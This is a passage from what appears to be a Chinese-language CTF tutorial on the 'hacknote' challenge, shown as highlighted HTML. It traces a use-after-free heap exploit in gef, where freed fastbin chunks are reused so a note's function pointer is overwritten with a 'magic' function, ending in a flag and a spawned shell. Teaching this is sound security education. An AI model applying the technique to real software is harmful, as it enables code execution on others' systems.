+<span class="err">---</span><span class="nf">Type</span> <span class="err">&lt;</span><span class="no">return</span><span class="err">&gt;</span> <span class="no">to</span> <span class="no">continue</span><span class="p">,</span> <span class="no">or</span> <span class="mh">q</span> <span class="p">&lt;</span><span class="no">return</span><span class="p">&gt;</span> <span class="no">to</span> <span class="no">quit---</span>
+<span class="err">[</span><span class="c">#0] 0x8048761 → Name: add_note()</span>
+<span class="err">[</span><span class="c">#1] 0x8048ac5 → Name: main()</span>
+<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunk</span> <span class="mi">0x0804b018</span>
+<span class="nf">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b018</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x28</span><span class="p">)</span>
+<span class="nf">Chunk</span> <span class="no">size</span><span class="p">:</span> <span class="mi">40</span> <span class="p">(</span><span class="mi">0x28</span><span class="p">)</span>
+<span class="nf">Usable</span> <span class="no">size</span><span class="p">:</span> <span class="mi">36</span> <span class="p">(</span><span class="mi">0x24</span><span class="p">)</span>
+<span class="nf">Previous</span> <span class="no">chunk</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0</span> <span class="p">(</span><span class="mi">0x0</span><span class="p">)</span>
+<span class="nf">PREV_INUSE</span> <span class="no">flag</span><span class="p">:</span> <span class="no">On</span>
+<span class="nf">IS_MMAPPED</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
+<span class="nf">NON_MAIN_ARENA</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
+</pre></div>
+
+<p>类似的，我们可以得到note1的地址以及其content的地址分别为0x0804b040 和0x0804b050。</p>
+<p>同时，我们还可以看到note0与note1对应的content确实是相应的内存块。</p>
+<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">grep</span> <span class="no">aaaa</span>
+<span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">aaaa</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
+<span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x804b000</span><span class="p">-</span><span class="mi">0x806c000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
+  <span class="err">0</span><span class="nf">x804b018</span> <span class="p">-</span> <span class="mi">0x804b01c</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="no">aaaa</span><span class="err">&quot;</span> 
+<span class="no">gef</span><span class="err">➤</span>  <span class="no">grep</span> <span class="no">ddaa</span>
+<span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">ddaa</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
+<span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x804b000</span><span class="p">-</span><span class="mi">0x806c000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
+  <span class="err">0</span><span class="nf">x804b050</span> <span class="p">-</span> <span class="mi">0x804b054</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="no">ddaa</span><span class="err">&quot;</span> 
+</pre></div>
+
+<p>下面就是free的过程了。我们可以依次发现首先，note0的content被free</p>
+<div class="codehilite"><pre><span></span> <span class="err">→</span>  <span class="err">0</span><span class="nf">x8048893</span> <span class="err">&lt;</span><span class="no">del_note</span><span class="err">+</span><span class="mi">143</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484c0</span> <span class="p">&lt;</span><span class="no">free@plt</span><span class="p">&gt;</span>
+   <span class="err">↳</span>   <span class="err">0</span><span class="nf">x80484c0</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span>     <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a018</span>
+       <span class="err">0</span><span class="nf">x80484c6</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">6</span><span class="err">&gt;</span>     <span class="no">push</span>   <span class="mi">0x18</span>
+       <span class="err">0</span><span class="nf">x80484cb</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span>    <span class="no">jmp</span>    <span class="mi">0x8048480</span>
+       <span class="err">0</span><span class="nf">x80484d0</span> <span class="err">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a01c</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
+<span class="err">[&#39;0</span><span class="nf">xffffcf20</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
+<span class="err">8</span>
+<span class="err">0</span><span class="nf">xffffcf20</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="err">&quot;</span><span class="no">aaaa</span><span class="err">&quot;</span>  <span class="err">←</span> <span class="no">$esp</span>
+</pre></div>
+
+<p>然后是note0本身</p>
+<div class="codehilite"><pre><span></span> <span class="err">→</span>  <span class="err">0</span><span class="nf">x80488a9</span> <span class="err">&lt;</span><span class="no">del_note</span><span class="err">+</span><span class="mi">165</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484c0</span> <span class="p">&lt;</span><span class="no">free@plt</span><span class="p">&gt;</span>
+   <span class="err">↳</span>   <span class="err">0</span><span class="nf">x80484c0</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span>     <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a018</span>
+       <span class="err">0</span><span class="nf">x80484c6</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">6</span><span class="err">&gt;</span>     <span class="no">push</span>   <span class="mi">0x18</span>
+       <span class="err">0</span><span class="nf">x80484cb</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span>    <span class="no">jmp</span>    <span class="mi">0x8048480</span>
+       <span class="err">0</span><span class="nf">x80484d0</span> <span class="err">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a01c</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
+<span class="err">[&#39;0</span><span class="nf">xffffcf20</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
+<span class="err">8</span>
+<span class="err">0</span><span class="nf">xffffcf20</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x0804865b</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">print_note_content</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">ebp</span>  <span class="err">←</span> <span class="no">$esp</span>
+</pre></div>
+
+<p>当delete结束后，我们观看一下bins，可以发现，确实其被存放在对应的fast bin中，</p>
+<div class="codehilite"><pre><span></span><span class="n">gef</span><span class="err">➤</span>  <span class="n">heap</span> <span class="n">bins</span>
+<span class="err">───────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">Fastbins</span> <span class="k">for</span> <span class="n">arena</span> <span class="mh">0xf7fac780</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────────</span>
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x8</span><span class="p">]</span>  <span class="err">←</span>  <span class="n">UsedChunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x804b008</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x10</span><span class="p">)</span> 
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0xc</span><span class="p">]</span> <span class="mh">0x00</span>
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x10</span><span class="p">]</span> <span class="mh">0x00</span>
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x14</span><span class="p">]</span>  <span class="err">←</span>  <span class="n">UsedChunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x804b018</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x28</span><span class="p">)</span> 
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x18</span><span class="p">]</span> <span class="mh">0x00</span>
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x1c</span><span class="p">]</span> <span class="mh">0x00</span>
+<span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x20</span><span class="p">]</span> <span class="mh">0x00</span>
+</pre></div>
+
+<p>当我们将note1也全部删除完毕后，再次观看bins。可以看出，后删除的chunk块确实处于表头。</p>
+<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">bins</span>
+<span class="err">───────────────────────────────────────────────────────────[</span> <span class="nf">Fastbins</span> <span class="no">for</span> <span class="no">arena</span> <span class="mi">0xf7fac780</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────────</span>
+<span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x8</span><span class="p">]</span>  <span class="err">←</span>  <span class="no">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b040</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x10</span><span class="p">)</span>  <span class="err">←</span>  <span class="no">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b008</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x10</span><span class="p">)</span> 
+<span class="no">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">1</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0xc</span><span class="p">]</span> <span class="mi">0x00</span>
+<span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">2</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x10</span><span class="p">]</span> <span class="mi">0x00</span>
+<span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">3</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x14</span><span class="p">]</span>  <span class="err">←</span>  <span class="no">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b050</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x28</span><span class="p">)</span>  <span class="err">←</span>  <span class="no">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b018</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x28</span><span class="p">)</span> 
+<span class="no">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">4</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x18</span><span class="p">]</span> <span class="mi">0x00</span>
+<span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">5</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x1c</span><span class="p">]</span> <span class="mi">0x00</span>
+<span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">6</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20</span><span class="p">]</span> <span class="mi">0x00</span>
+</pre></div>
+
+<p>那么，此时即将要申请note2，我们可以看下note2都申请到了什么内存块，如下</p>
+<p><strong>申请note2对应的内存块为0x804b040，其实就是note1对应的内存地址。</strong></p>
+<div class="codehilite"><pre><span></span><span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
+<span class="err">0</span><span class="nf">x080486cf</span> <span class="no">in</span> <span class="no">add_note</span> <span class="p">()</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">registers</span> <span class="p">]</span><span class="err">────</span>
+<span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b040</span>  <span class="err">→</span>  <span class="mi">0x0804b000</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0xf7fac780</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x0804b040</span>  <span class="err">→</span>  <span class="mi">0x0804b000</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esp</span>   <span class="p">:</span> <span class="mi">0xffffcf10</span>  <span class="err">→</span>  <span class="mi">0x00000008</span>
+<span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0xffffcf48</span>  <span class="err">→</span>  <span class="mi">0xffffcf68</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$eip</span>   <span class="p">:</span> <span class="mi">0x080486cf</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">89</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+<span class="nf">$cs</span>    <span class="p">:</span> <span class="mi">0x00000023</span>
+<span class="nf">$ss</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$ds</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$es</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$fs</span>    <span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="nf">$gs</span>    <span class="p">:</span> <span class="mi">0x00000063</span>
+<span class="nl">$eflags:</span> <span class="err">[</span><span class="nf">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">ZERO</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nl">code:</span><span class="nf">i386</span> <span class="p">]</span><span class="err">────</span>
+    <span class="err">0</span><span class="nf">x80486c2</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">76</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">eax</span><span class="p">],</span> <span class="no">eax</span>
+    <span class="err">0</span><span class="nf">x80486c4</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">78</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x86a0cec</span><span class="p">],</span> <span class="no">al</span>
+    <span class="err">0</span><span class="nf">x80486ca</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">84</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="mh">0x80484e0</span> <span class="p">&lt;</span><span class="no">malloc@plt</span><span class="p">&gt;</span>
+ <span class="err">→</span>  <span class="err">0</span><span class="nf">x80486cf</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">89</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+</pre></div>
+
+<p><strong>申请note2的content的内存地址为0x804b008，就是note0对应的地址，即此时我们向note2的content写内容，就会将note0的put字段覆盖。</strong></p>
+<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">n</span> <span class="mi">1</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
+<span class="err">0</span><span class="nf">x08048761</span> <span class="no">in</span> <span class="no">add_note</span> <span class="p">()</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">registers</span> <span class="p">]</span><span class="err">────</span>
+<span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x0804b040</span>  <span class="err">→</span>  <span class="mi">0x0804865b</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">print_note_content</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">ebp</span>
+<span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0xf7fac780</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esp</span>   <span class="p">:</span> <span class="mi">0xffffcf10</span>  <span class="err">→</span>  <span class="mi">0x00000008</span>
+<span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0xffffcf48</span>  <span class="err">→</span>  <span class="mi">0xffffcf68</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$eip</span>   <span class="p">:</span> <span class="mi">0x08048761</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">235</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+<span class="nf">$cs</span>    <span class="p">:</span> <span class="mi">0x00000023</span>
+<span class="nf">$ss</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$ds</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$es</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$fs</span>    <span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="nf">$gs</span>    <span class="p">:</span> <span class="mi">0x00000063</span>
+<span class="nl">$eflags:</span> <span class="err">[</span><span class="nf">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">ZERO</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nl">code:</span><span class="nf">i386</span> <span class="p">]</span><span class="err">────</span>
+    <span class="err">0</span><span class="nf">x8048752</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">220</span><span class="err">&gt;</span>   <span class="no">mov</span>    <span class="no">al</span><span class="p">,</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x458b0804</span>
+    <span class="err">0</span><span class="nf">x8048757</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">225</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mi">0x581173df</span>
+    <span class="err">0</span><span class="nf">x804875c</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">230</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484e0</span> <span class="p">&lt;</span><span class="no">malloc@plt</span><span class="p">&gt;</span>
+ <span class="err">→</span>  <span class="err">0</span><span class="nf">x8048761</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">235</span><span class="err">&gt;</span>   <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+</pre></div>
+
+<p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的put指针已经被置为NULL了，这是由fastbin的free机制决定的。</p>
+<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">xw</span> <span class="mi">0x804b008</span>
+<span class="err">0</span><span class="nl">x804b008:</span>  <span class="err">0</span><span class="nf">x00000000</span>  <span class="mi">0x0804b018</span>
+</pre></div>
+
+<p>覆盖后，具体的值如下</p>
+<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">xw</span> <span class="mi">0x804b008</span>
+<span class="err">0</span><span class="nl">x804b008:</span>  <span class="err">0</span><span class="nf">x08048986</span>  <span class="mi">0x0804b00a</span>
+<span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">i</span> <span class="mi">0x08048986</span>
+   <span class="err">0</span><span class="nf">x8048986</span> <span class="err">&lt;</span><span class="no">magic</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">push</span>   <span class="no">ebp</span>
+</pre></div>
+
+<p>可以看出，确实已经被覆盖为我们所想要的magic函数了。</p>
+<p>最后执行的效果如下</p>
+<div class="codehilite"><pre><span></span><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./hacknote&#39;</span>: pid <span class="m">35030</span>
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+flag<span class="o">{</span>use_after_free<span class="o">}</span>----------------------
+       HackNote       
+----------------------
+ <span class="m">1</span>. Add note          
+ <span class="m">2</span>. Delete note       
+ <span class="m">3</span>. Print note        
+ <span class="m">4</span>. Exit              
+----------------------
+</pre></div>
+
+<p>同时，我们还可以借助gef的heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p>
+<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap-analysis-helper</span> 
+<span class="p">[*]</span> <span class="no">This</span> <span class="no">feature</span> <span class="no">is</span> <span class="no">under</span> <span class="no">development</span><span class="p">,</span> <span class="no">expect</span> <span class="no">bugs</span> <span class="no">and</span> <span class="no">unstability...</span>
+<span class="err">[+]</span> <span class="nf">Tracking</span> <span class="no">malloc</span><span class="p">()</span>
+<span class="err">[+]</span> <span class="nf">Tracking</span> <span class="no">free</span><span class="p">()</span>
+<span class="err">[+]</span> <span class="nf">Tracking</span> <span class="no">realloc</span><span class="p">()</span>
+<span class="err">[+]</span> <span class="nf">Disabling</span> <span class="no">hardware</span> <span class="no">watchpoints</span> <span class="p">(</span><span class="no">this</span> <span class="no">may</span> <span class="no">increase</span> <span class="no">the</span> <span class="no">latency</span><span class="p">)</span>
+<span class="err">[+]</span> <span class="nf">Dynamic</span> <span class="no">breakpoints</span> <span class="no">correctly</span> <span class="no">setup</span><span class="p">,</span> <span class="no">GEF</span> <span class="no">will</span> <span class="no">break</span> <span class="no">execution</span> <span class="no">if</span> <span class="no">a</span> <span class="no">possible</span> <span class="no">vulnerabity</span> <span class="no">is</span> <span class="no">found.</span>
+<span class="err">[*]</span> <span class="nl">Note:</span> <span class="nf">The</span> <span class="no">heap</span> <span class="no">analysis</span> <span class="no">slows</span> <span class="no">down</span> <span class="no">noticeably</span> <span class="no">the</span> <span class="no">execution.</span> 
+<span class="no">gef</span><span class="err">➤</span>  <span class="no">c</span>
+<span class="nf">Continuing.</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b018</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b050</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">free</span><span class="p">(</span><span class="mi">0x804b018</span><span class="p">)</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">watching</span> <span class="mi">0x804b018</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">free</span><span class="p">(</span><span class="mi">0x804b008</span><span class="p">)</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">watching</span> <span class="mi">0x804b008</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">free</span><span class="p">(</span><span class="mi">0x804b050</span><span class="p">)</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">watching</span> <span class="mi">0x804b050</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">free</span><span class="p">(</span><span class="mi">0x804b040</span><span class="p">)</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">watching</span> <span class="mi">0x804b040</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">Cleaning</span> <span class="no">up</span>
+<span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">Re-enabling</span> <span class="no">hardware</span> <span class="no">watchpoints</span>
+<span class="err">[</span><span class="nf">New</span> <span class="no">process</span> <span class="mi">36248</span><span class="p">]</span>
+<span class="nf">process</span> <span class="mi">36248</span> <span class="no">is</span> <span class="no">executing</span> <span class="no">new</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">dash</span>
